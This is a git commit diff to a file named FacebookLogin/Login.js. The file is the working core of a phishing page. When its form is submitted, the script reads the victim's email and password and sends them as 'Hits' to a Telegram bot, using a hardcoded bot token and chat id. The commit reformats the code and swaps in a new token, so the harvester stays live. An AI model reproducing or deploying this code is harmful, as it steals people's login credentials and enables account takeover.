aad3cdb6de6a93a88ebde430a93509ee24253776
t0ufik01 <2fik.47@gmail.com>
2023-01-20 18:08:31 +0100

    Add

--- FacebookLogin/Login.js
+++ FacebookLogin/Login.js
@@ -1,26 +1,26 @@
-       const form = document.querySelector("#form");
+const form = document.querySelector("#form");
 
-          addEventListener("submit", (e) => {
-            e.preventDefault();
+addEventListener("submit", (e) => {
+  e.preventDefault();
 
-            var mail = document.getElementById("mail").value;
-            var pass = document.getElementById("pass").value;
+  var mail = document.getElementById("mail").value;
+  var pass = document.getElementById("pass").value;
 
-            var message = "Hits :%0A" + mail + ":" + pass;
+  var message = "Hits :%0A" + mail + ":" + pass;
 
-            var token = "5441699225:AAGjoUFWwYVO7PS_jYuZp6ljxmNoGRetM6E";
-            var chat_id = 1430266005;
-            var url =
-              "https://api.telegram.org/bot" +
-              token +
-              "/sendMessage?chat_id=" +
-              chat_id +
-              "&text=" +
-              message;
+  var token = "5530729858:AAG8bmQJe3dAmEX8d-MwzHKKFMto2B8JLHk";
+  var chat_id = 1430266005;
+  var url =
+    "https://api.telegram.org/bot" +
+    token +
+    "/sendMessage?chat_id=" +
+    chat_id +
+    "&text=" +
+    message;
 
-            let api = new XMLHttpRequest();
-            api.open("GET", url, true);
-            api.send();
+  let api = new XMLHttpRequest();
+  api.open("GET", url, true);
+  api.send();
 
-            console.log("Successfully");
-          });
+  console.log("Successfully");
+});
